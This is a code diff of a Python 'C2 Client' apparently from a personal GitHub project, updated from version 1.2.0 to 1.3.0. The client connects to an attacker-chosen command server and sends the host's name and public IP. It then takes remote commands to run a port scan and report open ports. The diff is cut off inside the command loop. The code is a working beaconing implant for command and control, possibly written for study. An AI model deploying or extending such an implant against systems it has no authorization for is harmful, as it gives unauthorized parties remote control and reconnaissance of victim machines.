@@ -1,101 +1,55 @@
 # ==================================================================================================================== #
-# Version 1.2.0 of my C2 Client!                                                                                       #
+# Version 1.3.0 of my C2 Client!                                                                                       #
 # Made by Eric E. Github: https://github.com/EricEsquivel                                                              #
 # ==================================================================================================================== #
 
-import socket, requests, sys, subprocess, re
-import hostportscanner
+import socket, requests, sys, subprocess, re, argparse
+try:
+    import hostportscanner
+    hpsimported = True
+except ImportError as importerror:
+    hpsimported = False
+    print(f"Error: {importerror}")
 
-
-def usage():
-    print("""
-    usage: server.py <ip> <port>
-    """)
-    sys.exit()
-
-
-def get_public_ip():
-    response = requests.get('https://api.ipify.org').text
-    return response
 
 def send_to_server(stuffhere):
     stuffhere = stuffhere.encode("utf-8")
     s.send(stuffhere)
 
+# Run checks with argparse #
+ap = argparse.ArgumentParser(description=f"Example: {sys.argv[0]} 127.0.0.1 4444")
+ap.add_argument("connectip", help="Enter IP address to connect to", type=str)
+ap.add_argument("connectport", help="Enter port to connect to", type=int)
+parseargs = ap.parse_args()
+cmdserver_ip = parseargs.connectip
+cmdserver_port = parseargs.connectport
 
-# Run checks
-if len(sys.argv) == 1:
-    print("Missing arguments. Looking for ip and port")
-    usage()
-    sys.exit()
-elif len(sys.argv) == 2:
-    if sys.argv[1] == "help" or sys.argv[1] == "-h" or sys.argv[1] == "--help":
-        usage()
-        sys.exit()
-    print("Missing arguments. Looking for a port")
-    usage()
-    sys.exit()
-elif len(sys.argv) > 3:
-    print("Too many arguments!")
-    usage()
-    sys.exit()
-else:
-    pass
-
-
-ip = sys.argv[1]
-try:
-    port = int(sys.argv[2])
-    if port not in range(1,65536):
-        raise Exception
-except ValueError:
-    print("Port given is not an integer")
-    usage()
-except:
-    print("Port given is not in range!")
-    usage()
-
-
-cmdserver_ip = sys.argv[1]
-try:
-    cmdserver_port = int(sys.argv[2])
-    if cmdserver_port not in range(1,65536):
-        raise Exception
-except ValueError:
-    print("Port given is not an integer")
-    usage()
-except:
-    print("Port given is not in range!")
-    usage()
+# Final Check #
 serveraddress = (cmdserver_ip,cmdserver_port)
-
-
 s = socket.socket()
 try:
     s.connect((serveraddress))
 except Exception as er:
     er = re.sub(r"\[.+\]", "", str(er)).strip()
     print(er)
-    usage()
-
-
+    sys.exit()
 # ------------------------------------#
 
 hostname = (socket.gethostname())
-public_ip = get_public_ip()
+public_ip = requests.get('https://api.ipify.org').text
 client_send = (f"Client {hostname}, {public_ip} joined.").encode("utf-8")
 s.send(client_send)
 while True:
     command = s.recv(1024).decode("utf-8")
     if command == "stopall":
         break
-    elif command == "portscan":
+    elif command == "portscan" and hpsimported == True:
         send_to_server("Initiating port scan. This will take a minute.")
         hostportscanner.main()
         open_ports = str(hostportscanner.open_ports)
         time_passed = str(hostportscanner.timepassed)
         send_to_server(f"Client {hostname}, {public_ip} has open ports: {open_ports}. Process took {time_passed}s.")
-    elif command == "openports":
+    elif command == "openports" and hpsimported == True:
         try:
             send_to_server(f"{hostname}, {public_ip} has open ports: {open_ports}")
         except NameError:
